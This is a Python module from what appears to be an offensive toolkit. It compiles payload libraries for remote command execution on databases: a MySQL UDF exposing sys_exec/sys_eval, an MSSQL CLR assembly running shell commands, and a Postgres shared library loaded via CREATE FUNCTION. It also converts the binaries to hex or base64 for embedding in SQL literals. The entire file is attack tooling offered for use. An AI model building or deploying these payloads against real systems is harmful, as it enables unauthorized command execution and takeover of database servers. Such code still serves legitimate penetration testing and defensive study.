"""
Compiled-payload helpers for Session 3b RCE primitives.

Three source files live in this package:

  lib_mysqludf_sys.c   — MySQL/MariaDB UDF exposing sys_exec() and sys_eval()
  clr_cmd_exec.cs      — MSSQL CLR assembly exposing CmdExec.Run(@cmd)
  pg_cmd_exec.c        — Postgres shared library exposing pg_cmd_exec(text)

Each helper below compiles the relevant source with a system toolchain
and returns the resulting binary bytes. Results are cached on disk under
a per-user temp directory so repeated runs don't re-compile.

The compilers required are:
  gcc   — for .so on Linux and .dll via mingw on Windows
  csc   — for .NET Framework CLR assemblies (Windows)
  dotnet — alternative to csc, cross-platform

If the toolchain isn't present, the compile function raises
ToolchainMissing and the caller reports a clear skip reason.
"""

import base64
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

_HERE = Path(__file__).parent


class ToolchainMissing(RuntimeError):
    """Raised when the required compiler isn't on PATH."""


class CompileError(RuntimeError):
    """Raised when the compiler is present but compilation failed."""


# ---------------------------------------------------------------------
# Cache location
# ---------------------------------------------------------------------

def _cache_dir() -> Path:
    """~/.toolkit/rce-cache on POSIX, %USERPROFILE%\\.toolkit\\rce-cache
    on Windows."""
    d = Path.home() / ".toolkit" / "rce-cache"
    d.mkdir(parents=True, exist_ok=True)
    return d


# ---------------------------------------------------------------------
# MySQL UDF
# ---------------------------------------------------------------------

def _read_source(name: str) -> str:
    p = _HERE / name
    if not p.exists():
        raise CompileError(f"source file not found: {p}")
    return p.read_text(encoding="utf-8")


def build_mysql_udf(force: bool = False) -> bytes:
    """Compile lib_mysqludf_sys.c and return the resulting .so bytes.

    On Windows we still emit a Linux-style .so by default, because
    most MySQL targets are Linux. Pass force=True to rebuild.

    Uses gcc. Raises ToolchainMissing if gcc isn't available.
    """
    if shutil.which("gcc") is None:
        raise ToolchainMissing("gcc is not on PATH")

    cache = _cache_dir() / "lib_mysqludf_sys.so"
    if cache.exists() and not force:
        return cache.read_bytes()

    src = _read_source("lib_mysqludf_sys.c")

    with tempfile.TemporaryDirectory() as td:
        td_path = Path(td)
        c_path = td_path / "lib_mysqludf_sys.c"
        so_path = td_path / "lib_mysqludf_sys.so"
        c_path.write_text(src, encoding="utf-8")

        cmd = ["gcc", "-shared", "-fPIC", "-O2",
               "-Wl,--allow-shlib-undefined",
               "-Wl,--unresolved-symbols=ignore-all",
               "-o", str(so_path), str(c_path)]
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30)
        except Exception as e:
            raise CompileError(f"gcc invocation failed: {e}")

        if result.returncode != 0:
            raise CompileError(
                f"gcc returned {result.returncode}: "
                f"{result.stderr.strip()[:400]}")

        data = so_path.read_bytes()

    cache.write_bytes(data)
    return data


# ---------------------------------------------------------------------
# MSSQL CLR
# ---------------------------------------------------------------------

def build_mssql_clr(force: bool = False) -> bytes:
    """Compile clr_cmd_exec.cs and return the resulting .dll bytes.

    Prefers csc (older Windows toolchain), falls back to dotnet
    (cross-platform). Raises ToolchainMissing if neither is present.
    """
    cache = _cache_dir() / "clr_cmd_exec.dll"
    if cache.exists() and not force:
        return cache.read_bytes()

    src = _read_source("clr_cmd_exec.cs")

    csc = shutil.which("csc") or shutil.which("csc.exe")
    dotnet = shutil.which("dotnet")

    with tempfile.TemporaryDirectory() as td:
        td_path = Path(td)
        cs_path = td_path / "clr_cmd_exec.cs"
        dll_path = td_path / "clr_cmd_exec.dll"
        cs_path.write_text(src, encoding="utf-8")

        if csc:
            cmd = [
                csc, "/target:library", "/out:" + str(dll_path),
                "/reference:System.Data.dll",
                str(cs_path),
            ]
        elif dotnet:
            # dotnet needs a csproj. Build a minimal one on the fly.
            proj_dir = td_path / "proj"
            proj_dir.mkdir()
            (proj_dir / "proj.csproj").write_text(
                '<Project Sdk="Microsoft.NET.Sdk">'
                '<PropertyGroup>'
                '<TargetFramework>netstandard2.0</TargetFramework>'
                '<AssemblyName>clr_cmd_exec</AssemblyName>'
                '<EnableDefaultCompileItems>false</EnableDefaultCompileItems>'
                '</PropertyGroup>'
                '<ItemGroup><Compile Include="../clr_cmd_exec.cs" /></ItemGroup>'
                '</Project>',
                encoding="utf-8")
            try:
                result = subprocess.run(
                    [dotnet, "build", "-c", "Release",
                     "-o", str(td_path / "out"), str(proj_dir)],
                    capture_output=True, text=True, timeout=120)
            except Exception as e:
                raise CompileError(f"dotnet invocation failed: {e}")
            if result.returncode != 0:
                raise CompileError(
                    f"dotnet returned {result.returncode}: "
                    f"{result.stderr.strip()[:400]}")
            built = list((td_path / "out").glob("clr_cmd_exec.dll"))
            if not built:
                raise CompileError("dotnet build produced no dll")
            data = built[0].read_bytes()
            cache.write_bytes(data)
            return data
        else:
            raise ToolchainMissing(
                "no C# compiler on PATH (need csc or dotnet)")

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=60)
        except Exception as e:
            raise CompileError(f"csc invocation failed: {e}")

        if result.returncode != 0:
            raise CompileError(
                f"csc returned {result.returncode}: "
                f"{result.stderr.strip()[:400]}")

        data = dll_path.read_bytes()

    cache.write_bytes(data)
    return data


# ---------------------------------------------------------------------
# Postgres shared library
# ---------------------------------------------------------------------

def build_postgres_so(force: bool = False) -> bytes:
    """Compile pg_cmd_exec.c into a .so Postgres can load.

    Postgres extensions need the Postgres headers. For our purposes,
    the source only uses libc + the PostgreSQL function ABI, which is
    stable enough that we can compile without pg_config. The .so is
    loaded with CREATE FUNCTION ... AS '/path/to/so', 'pg_cmd_exec'
    LANGUAGE C, which doesn't require the extension packaging.
    """
    if shutil.which("gcc") is None:
        raise ToolchainMissing("gcc is not on PATH")

    cache = _cache_dir() / "pg_cmd_exec.so"
    if cache.exists() and not force:
        return cache.read_bytes()

    src = _read_source("pg_cmd_exec.c")

    with tempfile.TemporaryDirectory() as td:
        td_path = Path(td)
        c_path = td_path / "pg_cmd_exec.c"
        so_path = td_path / "pg_cmd_exec.so"
        c_path.write_text(src, encoding="utf-8")

        cmd = ["gcc", "-shared", "-fPIC", "-O2",
               "-o", str(so_path), str(c_path)]
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30)
        except Exception as e:
            raise CompileError(f"gcc invocation failed: {e}")

        if result.returncode != 0:
            raise CompileError(
                f"gcc returned {result.returncode}: "
                f"{result.stderr.strip()[:400]}")

        data = so_path.read_bytes()

    cache.write_bytes(data)
    return data


# ---------------------------------------------------------------------
# Convenience
# ---------------------------------------------------------------------

def to_hex(data: bytes) -> str:
    """Return '0x' + hex for use in SQL binary literals."""
    return "0x" + data.hex()


def to_base64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


__all__ = [
    "ToolchainMissing",
    "CompileError",
    "build_mysql_udf",
    "build_mssql_clr",
    "build_postgres_so",
    "to_hex",
    "to_base64",
]